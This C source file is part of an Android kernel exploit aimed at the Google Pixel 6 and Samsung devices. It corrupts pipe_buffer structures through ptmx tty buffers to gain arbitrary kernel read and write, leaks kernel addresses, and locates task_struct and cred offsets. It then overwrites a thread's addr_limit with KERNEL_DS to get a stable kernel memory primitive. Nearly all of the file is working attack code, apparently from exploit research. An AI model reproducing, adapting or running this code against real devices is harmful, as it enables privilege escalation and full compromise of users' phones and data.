#define _GNU_SOURCE
#include <unistd.h>
#include <stdio.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <string.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sched.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/epoll.h>
#include <sys/uio.h>
#include <limits.h>
#include <sys/eventfd.h>
#include <sys/timerfd.h>
#include <assert.h>
#include <sys/xattr.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <stdbool.h>
#include <sys/prctl.h>
#include <errno.h>
#include <pthread.h>
#include "util.h"
#include "rw.h"
#include "kernel_constants.h"
#include "uao.h"

void prepare_fake_struct_file(void *buffer, int f_count, int f_mode) {
#define set64(buf, offset, val) do { *(u64 *)&(buf)[(offset)] = (val); }while(0)
#define set32(buf, offset, val) do { *(u32 *)&(buf)[(offset)] = (val); }while(0)
    u8 *ff = buffer;
    memset(ff, 0, 1024);
    // We use VMEMMAP_START address for the file operations because
    // at offset +0x78, the flush() operation should be NULL.
    // For debugging you can replace this address with arbitrary address
    // such as 0x4141414141414141UL and observe the crash log.
    set64(ff, 
    OFFCHK(dev_config->kconsts.file_offsets.file_f_op), 
    dev_config->kzero_address - OFFCHK(dev_config->kconsts.file_operations_offsets.f_op_flush));
    set64(ff, OFFCHK(dev_config->kconsts.file_offsets.file_f_count), f_count);
    set32(ff,  OFFCHK(dev_config->kconsts.file_offsets.file_f_mode), f_mode);
}

static inline int *get_pipe(int *pipes, int index) {
    return &pipes[index*2];
}

u8 dummy_page[0x1000] = {0};

void flush_ptmx(int ptmx) {
    SYSCHK(ioctl(ptmx, TCFLSH, TCOFLUSH));
    SYSCHK(ioctl(ptmx, TCFLSH, TCIFLUSH));
}

void turn_on_ptmx(int ptmx) {
    SYSCHK(ioctl(ptmx, TCXONC, TCOON));
}

void turn_off_ptmx(int ptmx) {
    SYSCHK(ioctl(ptmx, TCXONC, TCOOFF));
}

void make_ptmx_non_blocking(int ptmx) {
    int flags = SYSCHK(fcntl(ptmx, F_GETFL, 0));
    SYSCHK(fcntl(ptmx, F_SETFL, flags | O_NONBLOCK));
}

void make_ptmx_blocking(int ptmx) {
    int flags = SYSCHK(fcntl(ptmx, F_GETFL, 0));
    SYSCHK(fcntl(ptmx, F_SETFL, flags & ~O_NONBLOCK));
}

void make_ptmx_echo(int ptmx) {
    struct termio new_term, old_term;
    SYSCHK(ioctl(ptmx, TCGETA, &old_term));
    new_term = old_term;
    new_term.c_iflag = 0;
    new_term.c_lflag = ECHO|ICANON;
    new_term.c_oflag &= ~OPOST;
    SYSCHK(ioctl(ptmx, TCSETA, &new_term));
}

void *leaker_thread(void *arg) {
    int ptmx = (int)(u64)arg;
    int ret = 0;

    flush_ptmx(ptmx);

    turn_off_ptmx(ptmx); // block right away
    memset(dummy_page, 0, 1024);
    ret = SYSCHK(write(ptmx, dummy_page, 1024));
    LOGD("\t[%s] Wrote %d bytes to ptmx\n", __func__, ret);
    return NULL;
}


int leak_pipe_buffer(int ptmx, int pipefd[2], u64 *buf_page, u64 *buf_ops) {
    make_ptmx_echo(ptmx);
    make_ptmx_blocking(ptmx);
    pthread_t th;

    pthread_create(&th, NULL, leaker_thread, (void *)(u64)ptmx);

    sleep(1);

    LOGD("\t[%s] Write to the pipe\n", __func__);
    SYSCHK(write(pipefd[1], dummy_page, 0x1000));

    turn_on_ptmx(ptmx);

    pthread_join(th, NULL);

    u8 buf[0x1000];

    make_ptmx_non_blocking(ptmx);

    int total = 1024;
    int remaining = total;
    while (remaining) {
        int ret = 0;
        LOGD("\t[%s] Try read %d bytes from ptmx\n", __func__, remaining);
        ret = read(ptmx, buf + (total - remaining), remaining);
        if (ret < 0) {
            usleep(100*1000);
            continue;
        }
        remaining -= ret;
    }

    /*
    for (int i = 0; i < 1024/8; i++) {
        u64 *p = (void *)buf;
        LOG("%016lx ", p[i]);
        if (((i + 1) % 8) == 0) {
            LOG("\n");
        }
    }
    LOG("\n");
    */

    struct pipe_buffer *pipe_buf = (void *)buf;
    pipe_buf += 1;
    if (buf_page) {
        *buf_page = pipe_buf->page;
    }
    if (buf_ops) {
        *buf_ops = pipe_buf->ops;
    }
    return 0;
}

u8 fake_pipe_buffer[1024];

void write_fake_pipe_buffer(int ptmx, struct pipe_buffer *pipe_buf, int idx) {
    int ret = 0;
    flush_ptmx(ptmx);
    turn_off_ptmx(ptmx);
    make_ptmx_non_blocking(ptmx);
    memset(fake_pipe_buffer, 0, sizeof(fake_pipe_buffer));
    memcpy(fake_pipe_buffer + idx * sizeof(struct pipe_buffer), pipe_buf, sizeof(struct pipe_buffer));
    ret = write(ptmx, fake_pipe_buffer, sizeof(fake_pipe_buffer));
    assert(ret == -1 && errno == EAGAIN);
}

bool identify_pipe(int *ptmxs, int nr_ptmx, int *pipes, int nr_pipes, int *ptmx_out, int *pipefd_out) {
    int i, ret;
    int *tmp_pipe;
    struct pipe_buffer pipe_buf;
    pipe_buf.page = 0;
    pipe_buf.offset = 0;
    pipe_buf.len = 0x41414141;
    pipe_buf.ops = 0;
    pipe_buf.flags = 0;
    pipe_buf.__filler = 0;
    pipe_buf.private = 0;
    for (i = 0; i < nr_ptmx; i++) {
        pipe_buf.len = 0x41414141 + i;
        // LOG("[%s] Writing fake pipe buffer (ptmx %d  len %08x)\n", __func__, i, pipe_buf.len);
        write_fake_pipe_buffer(ptmxs[i], &pipe_buf, 0);
    }
    for (i = 0; i < nr_pipes; i++) {
        tmp_pipe = get_pipe(pipes, i);
        // LOG("[%s] Reading from pipe %d (fd %d)\n", __func__, i, tmp_pipe[0]);
        SYSCHK(ioctl(tmp_pipe[0], FIONREAD, &ret));
        if (ret >= 0x41414141) {
            LOGD("[%s] Found corrupted pipe! ret = %08x\n", __func__, ret);
            if (ptmx_out) {
                *ptmx_out = ptmxs[ret - 0x41414141];
            }
            if (pipefd_out) {
                pipefd_out[0] = tmp_pipe[0];
                pipefd_out[1] = tmp_pipe[1];
            }
            return true;
        }
    }
    return false;
}

static inline u64 to_lm(struct rw_info *rw, u64 kaddr) {
    if (is_lm_addr(kaddr)) {
        return kaddr;
    }
    if (is_device("Google Pixel 6")) {
        return 0xffffff8000000000UL + (kaddr - rw->ki.kernel_base) + dev_config->ram_offset;
    }
    return kaddr - 0x4010000000UL + dev_config->ram_offset;
}

void reset_pipe(struct rw_info *rw) {
    struct pipe_buffer pipe_buf;
    memset(&pipe_buf, 0, sizeof(struct pipe_buffer));
    pipe_buf.page = rw->ki.pipe_buffer_page;
    pipe_buf.offset = 0;
    pipe_buf.len = 0x1000;
    pipe_buf.ops = rw->ki.pipe_buffer_ops;
    pipe_buf.flags = 0;
    pipe_buf.private = 0;

    write_fake_pipe_buffer(rw->pipe.corrupted_ptmx, &pipe_buf, 1);
}

void __pipe_kwrite(int ptmx, int pipefd[2], u64 buf_ops, u64 kaddr, void *buf, u64 size) {
    int ret = 0;

    struct pipe_buffer pipe_buf;
    memset(&pipe_buf, 0, sizeof(struct pipe_buffer));
    pipe_buf.page = virt_to_page(kaddr);
    // LOG("[%s] kaddr = %016lx  page = %016lx  size = %08x\n", __func__, kaddr, pipe_buf.page, (u32)size);
    pipe_buf.offset = kaddr & 0xfff;
    pipe_buf.len = 0;
    pipe_buf.ops = buf_ops;
    pipe_buf.flags = PIPE_BUF_FLAG_CAN_MERGE;
    pipe_buf.private = 0;

    write_fake_pipe_buffer(ptmx, &pipe_buf, 1);

    assert(size <= 0x1000);

    ret = write(pipefd[1], buf, size);
    if (ret < 0 || ret != size) {LOG("[%s] got ret = %d\n", __func__, ret); FAIL();}
}

int pipe_kwrite(struct rw_info *rw, u64 kaddr, void *buf, u64 size) {
    int buf_offset = 0;
    kaddr = to_lm(rw, kaddr);
    while(size) {
        int page_offset = kaddr & 0xfff;
        int len =  size > (0x1000-page_offset) ? (0x1000-page_offset) : size;
        __pipe_kwrite(rw->pipe.corrupted_ptmx, rw->pipe.corrupted_pipe, rw->ki.pipe_buffer_ops,
                    kaddr, (u8 *)buf+buf_offset, len);
        buf_offset += len;
        kaddr += len;
        size -= len;
    }
    return 0;
}

void __pipe_kread(int ptmx, int pipefd[2], u64 buf_ops, u64 kaddr, void *buf, u64 size) {
    int ret = 0;
    u8 tmp_buf[0x1000];

    struct pipe_buffer pipe_buf;
    memset(&pipe_buf, 0, sizeof(struct pipe_buffer));
    pipe_buf.page = virt_to_page(kaddr);
    // LOG("[%s] kaddr = %016lx  page = %016lx  size = %08x\n", __func__, kaddr, pipe_buf.page, (u32)size);
    pipe_buf.offset = 0;
    pipe_buf.len = 0x1000 + 1;
    pipe_buf.ops = buf_ops;
    pipe_buf.flags = 0;
    pipe_buf.private = 0;

    write_fake_pipe_buffer(ptmx, &pipe_buf, 0);

    ret = read(pipefd[0], tmp_buf, 0x1000);
    if (ret < 0 || ret != 0x1000) {LOG("[%s] got ret = %d\n", __func__, ret); FAIL();}

    memcpy(buf, tmp_buf, size > 0x1000 ? 0x1000 : size);
}

int pipe_kread(struct rw_info *rw, u64 kaddr, void *buf, u64 size) {
    u8 tmp_buf[0x1000];
    int buf_offset = 0;
    kaddr = to_lm(rw, kaddr);
    while (size) {
        int page_offset = kaddr & 0xfff;
        int len =  size > (0x1000-page_offset) ? (0x1000-page_offset) : size;
        __pipe_kread(rw->pipe.corrupted_ptmx, rw->pipe.corrupted_pipe, rw->ki.pipe_buffer_ops, 
                    kaddr, tmp_buf, 0x1000);
        memcpy(buf+buf_offset, tmp_buf + page_offset, len);
        buf_offset += len;
        kaddr += len;
        size -= len;
    }
    return 0;
}

void kwrite64(struct rw_info *rw, u64 kaddr, u64 val) {
    rw->kwrite(rw, kaddr, &val, sizeof(val));
}

u64 kread64(struct rw_info *rw, u64 kaddr) {
    u64 x = 0;
    rw->kread(rw, kaddr, &x, sizeof(x));
    return x;
}

void kwrite32(struct rw_info *rw, u64 kaddr, u32 val) {
    rw->kwrite(rw, kaddr, &val, sizeof(val));
}

u32 kread32(struct rw_info *rw, u64 kaddr) {
    u32 x = 0;
    rw->kread(rw, kaddr, &x, sizeof(x));
    return x;
}

void kread(struct rw_info *rw, u64 kaddr, void *buf, u64 size) {
    rw->kread(rw, kaddr, buf, size);
}

void kwrite(struct rw_info *rw, u64 kaddr, void *buf, u64 size) {
    rw->kwrite(rw, kaddr, buf, size);
}

bool find_thread_group(struct rw_info *rw, u64 leader, pid_t pid, pid_t tid, struct task_info *task) {
    u8 buf[0x1000];
    u64 thread = leader;

    do{
        pid_t task_tgid, task_pid;

        kread(rw, thread, buf, 0x1000);
        task_tgid = *(pid_t *)&buf[OFFCHK(dev_config->kconsts.task_struct_offsets.ts_tgid)];
        task_pid = *(pid_t *)&buf[OFFCHK(dev_config->kconsts.task_struct_offsets.ts_pid)];

        if (task_tgid == pid && (tid < 0 || task_pid == tid)) {
            task->task_struct = thread;
            task->files_struct = *(u64 *)&buf[OFFCHK(dev_config->kconsts.task_struct_offsets.ts_files)];
            return true;
        }
        thread = *(u64 *)&buf[OFFCHK(dev_config->kconsts.task_struct_offsets.ts_thread_group_next)] - OFFCHK(dev_config->kconsts.task_struct_offsets.ts_thread_group_next);
    }while(thread != leader);
    return false;
}

bool find_task_struct_by_pid_tid(struct rw_info *rw, pid_t pid, pid_t tid, struct task_info *task) {
    u8 buf[0x1000];
    u64 init_task = rw->ki.kernel_base + OFFCHK(dev_config->kconsts.kernel_offsets.k_init_task);
    u64 curr_task = init_task;

    do{
        
        pid_t task_tgid, task_pid;

        kread(rw, curr_task, buf, 0x1000);

        task_tgid = *(pid_t *)&buf[OFFCHK(dev_config->kconsts.task_struct_offsets.ts_tgid)];
        task_pid = *(pid_t *)&buf[OFFCHK(dev_config->kconsts.task_struct_offsets.ts_pid)];

        if (find_thread_group(rw, curr_task, pid, tid, task)) {
            return true;
        }

        curr_task = *(u64 *)&buf[OFFCHK(dev_config->kconsts.task_struct_offsets.ts_tasks_next)] - OFFCHK(dev_config->kconsts.task_struct_offsets.ts_tasks_next);
    } while(curr_task != init_task);

    return false;
}

bool find_current_task_struct(struct rw_info *rw, struct task_info *task) {
    return find_task_struct_by_pid_tid(rw, getpid(), gettid(), task);
}

u64 get_struct_file(struct rw_info *rw, struct task_info *task, int fd){
    u64 fdt = kread64(rw, task->files_struct + OFFCHK(dev_config->kconsts.files_struct_offsets.fs_fdt));

    u64 fd_array = kread64(rw, fdt + FDTABLE__FD);

    return kread64(rw, fd_array + fd*sizeof(u64));
}

#define VALIDATE_WRITE_BUF_OFFSET

int find_tty_struct_write_buf_offset(struct rw_info *rw, u64 pipe_inode_info_addr, u64 tty_struct_addr) {
    u8 pipe_inode_info_dump[0x100];
    u8 tty_struct_dump[1024];
    u8 tmp_buf[1024];

    kread(rw, pipe_inode_info_addr, pipe_inode_info_dump, sizeof(pipe_inode_info_dump));
    kread(rw, tty_struct_addr, tty_struct_dump, sizeof(tty_struct_dump));

    int write_buf_offset = 0;
    for (int o = 0; o < sizeof(pipe_inode_info_dump); o += 8) {
        u64 v = *(u64 *)&pipe_inode_info_dump[o];
        if (!is_lm_addr(v)) {
            continue;
        }
        void *write_buf = memmem(tty_struct_dump, sizeof(tty_struct_dump), &v, sizeof(v));
        if (write_buf == NULL) {
            continue;
        }
        write_buf_offset = (int)(write_buf - (void *)tty_struct_dump);
        LOGD("Candidate write_buf offset: %d (%016lx)\n", write_buf_offset, v);
#ifdef VALIDATE_WRITE_BUF_OFFSET
        kread(rw, v, tmp_buf, sizeof(tmp_buf));
        if (memmem(tmp_buf, sizeof(tmp_buf), &rw->ki.pipe_buffer_ops, sizeof(rw->ki.pipe_buffer_ops))) {
            break;
        }
#else
        break;
#endif
    }

    return write_buf_offset;
}

// This function effectively does tty->write_buf = 0;
void reset_ptmx(struct rw_info *rw, struct task_info *task) {
    u64 ptmx_struct_file = get_struct_file(rw, task, rw->pipe.corrupted_ptmx);
    u64 pipe_struct_file = get_struct_file(rw, task, rw->pipe.corrupted_pipe[0]);
    u64 pipe_inode_info_addr = kread64(rw, pipe_struct_file + OFFCHK(dev_config->kconsts.file_offsets.file_f_private_data));
    u64 tty_file_private_addr = kread64(rw, ptmx_struct_file + OFFCHK(dev_config->kconsts.file_offsets.file_f_private_data));
    u64 tty_struct_addr = kread64(rw, tty_file_private_addr + TTY_FILE_PRIVATE__TTY);

    int write_buf_offset = find_tty_struct_write_buf_offset(rw, pipe_inode_info_addr, tty_struct_addr);

    kwrite64(rw, tty_struct_addr + write_buf_offset, 0);
}

int filter_corrupted_files(int *ptmxs, int nr_ptmx, int *pipes, int nr_pipes, int *corrupted_ptmx, int corrupted_pipe[2]) {
    int *tmp_pipe;
    LOGD("Write page to every pipe\n");
    for (int i = 0; i < nr_pipes; i++) {
        tmp_pipe = get_pipe(pipes, i);
        SYSCHK(write(tmp_pipe[1], dummy_page, 0x1000));
    }

    int __corrupted_ptmx = 0;
    int __corrupted_pipe[2] = {0, 0};
    LOGD("Identifying pipe\n");
    if (!identify_pipe(ptmxs, nr_ptmx, pipes, nr_pipes, &__corrupted_ptmx, __corrupted_pipe)){
        LOG("Error: failed to find corrupted pipe\n");
        return -1;
    }

    // close all pipes and ptmxs that are not needed
    LOGD("Closing unneeded ptmxs\n");
    for (int i = 0; i < nr_ptmx; i++) {
        if (ptmxs[i] == __corrupted_ptmx) {
            continue;
        }
        close(ptmxs[i]);
        ptmxs[i] = -1;
    }

    LOGD("Closing unneeded pipes\n");
    for (int i = 0; i < nr_pipes; i++) {
        tmp_pipe = get_pipe(pipes, i);
        if (tmp_pipe[0] == __corrupted_pipe[0] && tmp_pipe[1] == __corrupted_pipe[1]) {
            continue;
        }
        close(tmp_pipe[0]);
        close(tmp_pipe[1]);
    }

    if (corrupted_ptmx) {
        *corrupted_ptmx = __corrupted_ptmx;
    }
    if (corrupted_pipe) {
        corrupted_pipe[0] = __corrupted_pipe[0];
        corrupted_pipe[1] = __corrupted_pipe[1];
    }
    return 0;
}


bool find_file_private_data_offset(struct rw_info *rw, struct task_info *task) {
    bool ret = false;
    int efd = SYSCHK(eventfd(0x41414141, 0));
    u64 efd_struct_file = get_struct_file(rw, task, efd);
    u8 file_dump[0x140];
    u8 tmp_buf[0x40];
    kread(rw, efd_struct_file, file_dump, sizeof(file_dump));
    for (int o = 0; o < sizeof(file_dump); o += 8) {
        u64 v = *(u64 *)&file_dump[o];
        if (!is_lm_addr(v)) {
            continue;
        }
        kread(rw, v, tmp_buf, sizeof(tmp_buf));
        u32 x = 0x41414141;
        if (memmem(tmp_buf, sizeof(tmp_buf), &x, sizeof(x))) {
            dev_config->kconsts.file_offsets.file_f_private_data = OFFSET(o);
            ret = true;
            goto exit;
        }
    }
exit:
    close(efd);
    return ret;
}

int pipe_close(struct rw_info *rw) {
    struct task_info curr;
    if (!find_current_task_struct(rw, &curr)) {
        LOG("[%s] Failed to find our task_struct\n", __func__);
        return -1;
    }
    LOGD("[%s] Found task struct: %016lx\n", __func__, curr.task_struct);
    if (!find_file_private_data_offset(rw, &curr)) {
        LOG("[%s] Failed to detect file->private_data offset\n", __func__);
        return -1;
    }
    LOGD("file->private_data offset: %d\n", dev_config->kconsts.file_offsets.file_f_private_data.offset);
    reset_pipe(rw);
    reset_ptmx(rw, &curr);

    close(rw->pipe.corrupted_ptmx);
    close(rw->pipe.corrupted_pipe[0]);
    close(rw->pipe.corrupted_pipe[1]);
    return 0;
}

u64 scan_for_kbase(struct rw_info *rw) {
    u8 tmp_buf[0x40];
    for (u64 kaddr = rw->ki.pipe_buffer_ops & ~0xfff; 
    kaddr >= 0xffffffc000000000UL; kaddr -= 0x1000) 
    {
        pipe_kread(rw, kaddr, tmp_buf, 0x40);
        if (!memcmp(&tmp_buf[0x38], "ARMd", 4)) {
            return kaddr;
        }
    }
    return 0;
}

int find_task_struct_offsets(struct rw_info *rw) {
    u64 init_task = rw->ki.kernel_base + OFFCHK(dev_config->kconsts.kernel_offsets.k_init_task);
    u8 init_task_dump[0x1000];
    u8 tmp_buf[0x1000];
    bool found_tasks = false;
    bool found_real_parent = false;

    kread(rw, init_task, init_task_dump, 0x1000);

    for (int offset = 0; offset < 0x1000 - 8; offset += 8) {
        u64 v1 = *(u64 *)&init_task_dump[offset];
        u64 v2 = *(u64 *)&init_task_dump[offset+8];
        if (!found_real_parent && v1 == init_task && v2 == init_task) {
            /* Found real_parent */
            found_real_parent = true;
            /* Now go backwards until you see 8 bytes all zeroes.
            This accounts for the case CONFIG_STACK_PROTECTOR is not defined. */
            for (int o = offset - 8; o >= 0; o -= 8) {
                u64 pid_tgid = *(u64 *)&init_task_dump[o];
                if (pid_tgid == 0) {
                    dev_config->kconsts.task_struct_offsets.ts_pid = OFFSET(o);
                    dev_config->kconsts.task_struct_offsets.ts_tgid = OFFSET(o + 4);
                    break;
                }
            }
            // We expect a gap of zeroes of at least 3*2 QWORDs. 
            // (Corresponds to the field `struct hlist_node pid_links[4];`.)
            int nz = 0;
            for (int o = offset + 8 + 8; o < 0x1000 - 8; o += 8) {
                u64 u1 = *(u64 *)&init_task_dump[o];
                u64 u2 = *(u64 *)&init_task_dump[o+8];
                if (u1 == 0) {
                    nz++;
                } else if (nz > 0 && nz < 3*2) {
                    // Failed to find thread_group offset.
                    break;
                } else if (nz > 0) {
                    if (u1 == u2 && u1 - o == init_task) {
                        // Offset found.
                        dev_config->kconsts.task_struct_offsets.ts_thread_group_next = OFFSET(o);
                        break;
                    }
                }
            }
        }
        if (!found_real_parent && !found_tasks) {
            u64 next = v1, prev = v2;
            if (!is_lm_addr(next) || !is_lm_addr(prev)) {
                continue;
            }
            /* If it's actually the "next", if we read it and look at the same offset
            for the prev field, we should go back to ourselves..:) */
            kread(rw, next-offset, tmp_buf, 0x1000);
            u64 next_prev = *(u64 *)&tmp_buf[offset + 8];
            if (next_prev - offset == init_task){
                found_tasks = true;
                dev_config->kconsts.task_struct_offsets.ts_tasks_next = OFFSET(offset);
            }
        }
    }

    /* Now we locate "files". The heuristic is as follows:
    1. First, locate the "comm" field, which is 16 bytes and contains the string "swapper" at the beginning.
    2. After the "comm" field locate the 2nd pointer pointing into the kernel data. (The 1st pointer is "fs".)
    The previous fields should be 0 for the init_task. */
    void *comm_field = memmem(init_task_dump, 0x1000, "swapper", sizeof("swapper")-1);
    if (comm_field == NULL) {
        LOG("Failed to find task_struct->comm offset\n");
        goto exit;
    }
    int np = 0;
    u64 init_files_struct = 0;
    for (int offset = (int)(comm_field-(void *)init_task_dump) + 16; offset < 0x1000; offset += 8) {
        u64 v = *(u64 *)&init_task_dump[offset];
        if ((v & 0xffffffc000000000UL) == 0xffffffc000000000UL) {
            np++;
            if (np == 2) {
                init_files_struct = v;
                dev_config->kconsts.task_struct_offsets.ts_files = OFFSET(offset);
                break;
            }
        }
    }

    if (init_files_struct) {
        kread(rw, init_files_struct, tmp_buf, 0x100);
        for (int offset = 0; offset < 0x100; offset += 8) {
            u64 v = *(u64 *)&tmp_buf[offset];
            if (v - (offset + 8) == init_files_struct) {
                dev_config->kconsts.files_struct_offsets.fs_fdt = OFFSET(offset);
                break;
            }
        }
    }

    int ts_cred_offset = (int)(comm_field- (void *)init_task_dump) - 16;
    dev_config->kconsts.task_struct_offsets.ts_cred = OFFSET(ts_cred_offset);

exit:
    LOG("[x] task_struct offsets:\n");
    LOG("\ttasks         at  %d\n", dev_config->kconsts.task_struct_offsets.ts_tasks_next.offset);
    LOG("\tpid           at  %d\n", dev_config->kconsts.task_struct_offsets.ts_pid.offset);
    LOG("\ttgid          at  %d\n", dev_config->kconsts.task_struct_offsets.ts_tgid.offset);
    LOG("\tthread_group  at  %d\n", dev_config->kconsts.task_struct_offsets.ts_thread_group_next.offset);
    LOG("\tfiles         at  %d\n", dev_config->kconsts.task_struct_offsets.ts_files.offset);
    LOG("\tcred          at  %d\n", dev_config->kconsts.task_struct_offsets.ts_cred.offset);

    LOG("[x] files_struct offsets:\n");
    LOG("\tfdt           at  %d\n", dev_config->kconsts.files_struct_offsets.fs_fdt.offset);

    return 0;
}

int find_offsets(struct rw_info *rw) {
    u64 init_task = kallsyms_lookup_name(rw, "init_task");
    if (init_task == 0) {
        return -1;
    }
    LOG("[x] Found init_task: %016lx\n", init_task);
    dev_config->kconsts.kernel_offsets.k_init_task = OFFSET(init_task-rw->ki.kernel_base);

    if (find_task_struct_offsets(rw) < 0) {return -1;}

    return 0;
}

int get_stable_rw(struct rw_info *rw) {
    LOG("[x] Leaking pipe buffer...\n");
    leak_pipe_buffer(rw->pipe.corrupted_ptmx, rw->pipe.corrupted_pipe, &rw->ki.pipe_buffer_page, &rw->ki.pipe_buffer_ops);
    if (rw->ki.pipe_buffer_page == 0 || rw->ki.pipe_buffer_ops == 0) {
        LOG("Failed to leak pipe buffer :(\n");
        return -1;
    }
    LOG("[x] Leaked pipe buffer oprerations: %016lx\n", rw->ki.pipe_buffer_ops);
    LOG("[x] Leaked pipe buffer page       : %016lx\n", rw->ki.pipe_buffer_page);

    /* For the Pixel 6, we find kernel base using kallsyms.
     * For Samsung-based devices we find kernel base by scanning backwards.
     */
    if (!is_device("Google Pixel 6")) {
        rw->ki.kernel_base = scan_for_kbase(rw);
    }

    rw->kread = pipe_kread;
    rw->kwrite = pipe_kwrite;
    rw->kclose = pipe_close;

    if (!find_kallsyms(rw)) { return -1; }

    if (!rw->ki.kernel_base) {
        rw->ki.kernel_base = kallsyms_lookup_name(rw, "_head");
        if (!rw->ki.kernel_base) {
            LOG("Failed to find kbase :(\n");
            return -1;
        }
    }

    LOG("[x] Kernel base: %016lx\n", rw->ki.kernel_base);

    if (find_offsets(rw) < 0) {return -1;}

    if (uao_init(rw) < 0) { return -1; }

    // Find task struct address
    if (!find_task_struct_by_pid_tid(rw, getpid(), rw->uao.tid, &rw->uao.uao_thread)){
        return -1;
    }

    LOG("[x] task_struct: %016lx\n", rw->uao.uao_thread.task_struct);
    // Patch the addr limit of "uao_thread" to KERNEL_DS
    kwrite64(rw, rw->uao.uao_thread.task_struct + TASK_STRUCT__ADDR_LIMIT, KERNEL_DS);

    char armd[4];
    uao_kread(rw, rw->ki.kernel_base + 0x38, armd, 4);
    if (memcmp(armd, "ARMd", 4)) {
        LOG("UAO-based read/write failed\n");
        rw->kclose(rw);
        return -1;
    }

    rw->kclose(rw);

    LOGD("Switched to UAO-based read/write primitive\n");
    rw->kread = uao_kread;
    rw->kwrite = uao_kwrite;
    rw->kclose = uao_close;

    return 0;
}

